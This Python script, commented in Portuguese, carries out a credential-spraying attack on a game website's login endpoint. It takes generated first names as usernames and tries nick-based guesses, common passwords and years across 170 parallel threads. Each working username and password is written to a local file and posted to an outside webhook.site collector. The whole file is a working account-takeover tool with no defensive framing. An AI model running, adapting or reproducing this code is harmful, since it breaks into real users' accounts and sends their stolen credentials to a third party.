import requests
import random
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

def fetch_nicks_from_api():
    url = "https://fakerapi.it/api/v1/custom?_quantity=2000&_locale=en_US&first_name=firstName"
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()["data"]
        return [item["first_name"] for item in data]
    else:
        print(f"Erro ao obter nicks da API: {response.status_code}")
        return []

def generate_random_number():
    return random.randint(1720000000000, 1729999999999)

def login_gartic(nick, senha):
    rand = generate_random_number()
    url = f"https://www.gartik.com/log_ajax.php?rand={rand}"

    payload = {
        "userLogin": nick,
        "senhaLogin": senha
    }

    try:
        response = requests.post(url, data=payload)
        response_data = response.json()

        if "erro" in response_data:
            print(f"Falha no login com nick: {nick} e senha: {senha}")
            return {"erro": True, "mensagem": response_data["erro"]}
        else:
            print(f"Sucesso no login com nick: {nick} e senha: {senha}")
            return response_data

    except requests.exceptions.RequestException as e:
        print(f"Erro de requisição para nick: {nick} e senha: {senha}: {e}")
        return {"erro": True, "mensagem": str(e)}

def try_login_with_nick_and_passwords(nick, passwords, successful_logins):
    clean_nick = nick.replace("_", "")
    nick_without_numbers = ''.join(filter(lambda x: not x.isdigit(), nick))

    senhas_a_tentar = [nick, clean_nick, nick_without_numbers] + \
                      [nick + suffix for suffix in ["123", "1234", "12345"]] + \
                      [clean_nick + suffix for suffix in ["123", "1234", "12345"]] + \
                      passwords

    for senha in senhas_a_tentar:
        print(f"Tentando login com nick: {nick} e senha: {senha}")
        response = login_gartic(nick, senha)
        if response.get("erro"):
            continue
        else:
            login_data = {
                "userLogin": response["userLogin"],
                "senha": senha,
                "pontos": response["pontos"],
                "vitorias": response["vitorias"]
            }
            # Prioridade para enviar ao Webhook
            send_webhook_notification(response['userLogin'], senha, response['pontos'], response['vitorias'])

            # Salva o login bem-sucedido
            successful_logins.append(login_data)
            save_to_json(successful_logins)
            return login_data  # Retorna o resultado completo para o console

    return False

def save_to_json(data):
    with open("successful_logins.json", "w") as file:
        json.dump(data, file, indent=4)

def generate_year_passwords():
    year_passwords = []
    for year in range(1980, 2024):
        year_passwords.append(str(year))
    return year_passwords

def send_webhook_notification(userLogin, senha, pontos, vitorias):
    webhook_url = "https://webhook.site/2b1ba509-12dd-461b-97a3-2c56f741feb7"

    payload = {
        "text": f"Nick: {userLogin} | Senha: {senha} | Pontos: {pontos} | Vitórias: {vitorias}"
    }

    try:
        requests.post(webhook_url, data=payload)
    except requests.exceptions.RequestException as e:
        print(f"Erro ao enviar notificação para o Webhook: {e}")

def main():
    print("O script foi iniciado.")

    nicks = fetch_nicks_from_api()  # Obtém nicks da API
    common_passwords = ["123", "1234", "12345", "123456", "1234567890", "01234", "012345", "123456789",
                        "gartic", "gartic123", "gartic1234", "gartic12345",
                        "0000", "000", "00000", "000000", "gartic123456", "0123", "senha", "nick", "password", "qwerty",
                        "654321", "987654321", "321", "4321", "111111", "admin", "123123"]
    year_passwords = generate_year_passwords()

    passwords_to_try = common_passwords + year_passwords

    successful_logins = []

    try:
        with open("successful_logins.json", "r") as file:
            successful_logins = json.load(file)
    except FileNotFoundError:
        pass

    with ThreadPoolExecutor(max_workers=170) as executor:
        futures = []
        for nick in nicks:
            future = executor.submit(try_login_with_nick_and_passwords, nick, passwords_to_try, successful_logins)
            futures.append(future)

        for future in as_completed(futures):
            try:
                result = future.result()
                if result and isinstance(result, dict):  # Certifica-se de que o resultado é um dicionário válido
                    print(f"Login bem-sucedido para o nick: {result['userLogin']}")
            except Exception as exc:
                print(f"Exceção ao tentar fazer login: {exc}")

    save_to_json(successful_logins)

    print("O script foi finalizado.")

if __name__ == "__main__":
    main()
